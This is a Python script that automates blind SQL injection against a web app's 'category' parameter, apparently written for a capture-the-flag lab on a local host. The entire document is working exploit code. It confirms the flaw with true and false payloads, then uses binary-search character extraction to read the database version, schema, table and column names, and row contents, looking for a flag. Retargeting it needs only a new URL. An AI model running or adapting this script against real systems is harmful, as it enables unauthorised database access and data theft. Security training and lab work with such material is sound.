import requests
import urllib.parse
import string

# Configuration
target = "http://127.0.0.1:32780/"
PHPSESSID = "a619c2d322b0d2025997d9751eb6d09a"
timeout_seconds = 10

# Cookie jar
cookies = {"PHPSESSID": PHPSESSID}

# Vulnerability check function
def check_payload(payload):
    """Returns True if payload evaluates to TRUE, False otherwise"""
    encoded_payload = urllib.parse.quote(payload)
    url = f"{target}?category={encoded_payload}"
    
    try:
        response = requests.get(url, cookies=cookies, timeout=timeout_seconds)
        # If "does not exist" is in response, condition was FALSE
        return "does not exist" not in response.text
    except Exception as e:
        print(f"[!] Request failed: {e}")
        return False

# Extraction functions
def extract_length(query):
    """Extract length of result using binary search"""
    low, high = 0, 100
    
    # First find upper bound
    while not check_payload(f"Nature' AND ({query})={high}--"):
        low = high
        high *= 2
        if high > 500:
            break
    
    # Binary search
    while low <= high:
        mid = (low + high) // 2
        if check_payload(f"Nature' AND ({query})={mid}--"):
            return mid
        elif check_payload(f"Nature' AND ({query})>{mid}--"):
            low = mid + 1
        else:
            high = mid - 1
    
    return 0

def extract_string(query, length):
    """Extract string character by character using binary search"""
    result = ""
    chars = string.printable.replace('%', '')  # Remove % to avoid URL encoding issues
    
    for pos in range(1, length + 1):
        low, high = 32, 126  # ASCII printable range
        
        # Binary search for each character
        while low <= high:
            mid = (low + high) // 2
            if check_payload(f"Nature' AND ASCII(SUBSTRING(({query}),{pos},1))={mid}--"):
                result += chr(mid)
                print(f"[+] Extracted: {result}", end="\r")
                break
            elif check_payload(f"Nature' AND ASCII(SUBSTRING(({query}),{pos},1))>{mid}--"):
                low = mid + 1
            else:
                high = mid - 1
        else:
            result += "?"  # Unknown character
    
    print()  # New line after extraction
    return result

def extract_data():
    """Main extraction function"""
    print("=" * 60)
    print("BLIND SQL INJECTION DATA EXTRACTION")
    print("=" * 60)
    
    # Confirm vulnerability first
    print("\n[1] Confirming vulnerability...")
    if not check_payload("Nature' AND '1'='1--"):
        print("[-] TRUE condition failed - vulnerability may not exist")
        return
    
    if not check_payload("Nature' AND '1'='2--"):
        print("[+] FALSE condition confirmed")
    else:
        print("[-] FALSE condition failed - vulnerability may be patched")
        return
    
    print("[+] Vulnerability confirmed!")
    
    # Get database version
    print("\n[2] Extracting database version...")
    version_query = "SELECT @@version"
    version_len = extract_length(f"LENGTH({version_query})")
    print(f"[+] Version length: {version_len}")
    version = extract_string(version_query, version_len)
    print(f"[+] Database version: {version}")
    
    # Get current database name
    print("\n[3] Extracting current database name...")
    db_query = "SELECT database()"
    db_len = extract_length(f"LENGTH({db_query})")
    print(f"[+] DB name length: {db_len}")
    db_name = extract_string(db_query, db_len)
    print(f"[+] Current database: {db_name}")
    
    # Get number of tables
    print("\n[4] Extracting table information...")
    table_count_query = f"SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='{db_name}'"
    table_count = extract_length(table_count_query)
    print(f"[+] Number of tables: {table_count}")
    
    # Extract table names
    tables = []
    for i in range(table_count):
        print(f"\n[+] Extracting table {i+1} name...")
        table_query = f"SELECT table_name FROM information_schema.tables WHERE table_schema='{db_name}' LIMIT {i},1"
        table_len = extract_length(f"LENGTH({table_query})")
        table_name = extract_string(table_query, table_len)
        print(f"[+] Table {i+1}: {table_name}")
        tables.append(table_name)
    
    # Check each table for columns and data
    for table in tables:
        print(f"\n[5] Extracting columns for table '{table}'...")
        
        # Get column count
        col_count_query = f"SELECT COUNT(*) FROM information_schema.columns WHERE table_schema='{db_name}' AND table_name='{table}'"
        col_count = extract_length(col_count_query)
        print(f"[+] Table '{table}' has {col_count} columns")
        
        # Extract column names
        columns = []
        for i in range(col_count):
            col_query = f"SELECT column_name FROM information_schema.columns WHERE table_schema='{db_name}' AND table_name='{table}' LIMIT {i},1"
            col_len = extract_length(f"LENGTH({col_query})")
            col_name = extract_string(col_query, col_len)
            print(f"  [+] Column {i+1}: {col_name}")
            columns.append(col_name)
        
        # If we have columns, try to extract data
        if columns:
            print(f"\n[6] Extracting data from table '{table}'...")
            
            # Check number of rows
            row_count_query = f"SELECT COUNT(*) FROM {table}"
            try:
                row_count = extract_length(row_count_query)
                print(f"[+] Table '{table}' has {row_count} rows")
                
                # Extract first few rows
                for row in range(min(row_count, 3)):
                    print(f"\n  [+] Row {row + 1}:")
                    row_data = {}
                    for col in columns:
                        data_query = f"SELECT {col} FROM {table} LIMIT {row},1"
                        data_len = extract_length(f"LENGTH({data_query})")
                        if data_len > 0 and data_len < 1000:
                            data = extract_string(data_query, data_len)
                            print(f"    {col}: {data}")
                            row_data[col] = data
                            
                            # Check for flag pattern
                            if 'flag' in data.lower() or 'FLAG{' in data:
                                print(f"\n[!] POTENTIAL FLAG FOUND: {data}")
                                return data
                        else:
                            print(f"    {col}: <data too long or empty>")
            except:
                print(f"[-] Could not extract data from table '{table}'")
    
    print("\n[+] Extraction complete - check output above for any flags")
    return None

if __name__ == "__main__":
    flag = extract_data()
    if flag:
        print(f"\n[!] FLAG DISCOVERED: {flag}")
    else:
        print("\n[-] No flag found in accessible tables")
